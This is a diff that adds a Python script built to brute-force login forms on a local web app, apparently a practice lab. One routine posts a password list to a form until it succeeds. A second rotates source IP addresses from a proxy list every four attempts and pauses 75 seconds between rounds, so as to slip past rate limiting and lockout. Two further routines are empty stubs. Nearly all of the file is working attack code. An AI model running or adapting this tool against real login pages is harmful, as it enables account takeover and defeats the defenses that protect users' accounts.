@@ -1,0 +1,146 @@
+# imports
+import time
+import requests
+import http.client
+from termcolor import colored
+
+
+'''
+	Login form bruteforce class:
+		each login form has implements different techniques
+		to evade the implemented login form security
+'''
+class Attack():
+	def __init__(self):
+		# url of website
+		self.url = 'http://localhost:5000'
+
+		# username to bruteforce
+		self.username = ''
+
+		# list of proxies
+		self.proxies = [line.strip() for line in open('proxies', 'r')]
+
+		# list of commonly used passwords
+		self.passwords = [line.strip() for line in open('passwords', 'r')]
+
+		self.select()
+
+
+	# select login form to try to attack
+	def select(self):
+
+		# get login form and username
+		route = input('Login form number [1, 5]: ')
+		self.username = input('Username to attack: ')
+		self.url = f'{self.url}/login_{route}'
+
+		# launch attack
+		if route == '1':
+			self.form_1()
+
+		if route == '2':
+			self.form_2()
+
+		if route == '3':
+			self.form_3()
+
+		if route == '4':
+			self.form_4()
+
+
+	# attack login form #1
+	def form_1(self):
+
+		# try each password until success status
+		index = 0
+		for p in self.passwords:
+			# create login data
+			data = {
+				'username': self.username,
+				'password': p,
+			}
+
+			# send the request
+			response = requests.post(self.url, data=data)
+
+			# verify login status
+			if b'incorrect' in response.content:
+				c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
+				print(f'{c} : {self.username, p}')
+			else:
+				c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
+				print(f'\n{c} : {self.username, p}')
+				break
+
+			index += 1
+
+
+	# attack login form #2
+	def form_2(self, index=0):
+		
+		# end of proxy ranges
+		ranges = ['10.0.0.254', '172.16.1.254', '172.16.2.254']
+		range_reached = False
+  
+		# rotate proxies
+		for proxy in self.proxies:
+			# use current proxy 4 times
+			for _ in range(4):
+				password = self.passwords[index] 
+				data = f'username={self.username}&password={password}'
+    
+				# bind proxy address, skip if range changed
+				socket = http.client.HTTPConnection('localhost', 5000, source_address=(proxy, 0))
+				if range_reached:
+					continue
+     
+				# send login request
+				socket.request('POST', '/login_2', body=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+				
+				response = socket.getresponse()
+				response = response.read().decode('utf-8')
+				
+				# verify login status
+				if 'incorrect' in response:
+					c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
+					print(f'{c} : {self.username, password}')
+				else:
+					c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
+					print(f'\n{c} : {self.username, password}')
+					return
+
+				# close socket, increase password index
+				socket.close()
+				if index + 1 >= len(self.passwords):
+					return
+				else:
+					index += 1
+     
+			# check if proxy range changed, reset range flag
+			range_reached = False
+			if proxy in ranges:
+				range_reached = True
+    
+		# sleep then attempt next set of passwords
+		if index < len(self.passwords):
+			c = '[' + colored('Waiting', 'yellow', attrs=['bold']) + ']'
+			print(f'\n{c} : will continue in 75 seconds')
+			time.sleep(75)
+			self.form_2(index)
+
+  
+	# attack login form #3
+	def form_3(self):
+		pass
+
+
+	# attack login form #4
+	def form_4(self):
+		pass
+
+
+
+# start
+if __name__ == '__main__':
+	attack = Attack()
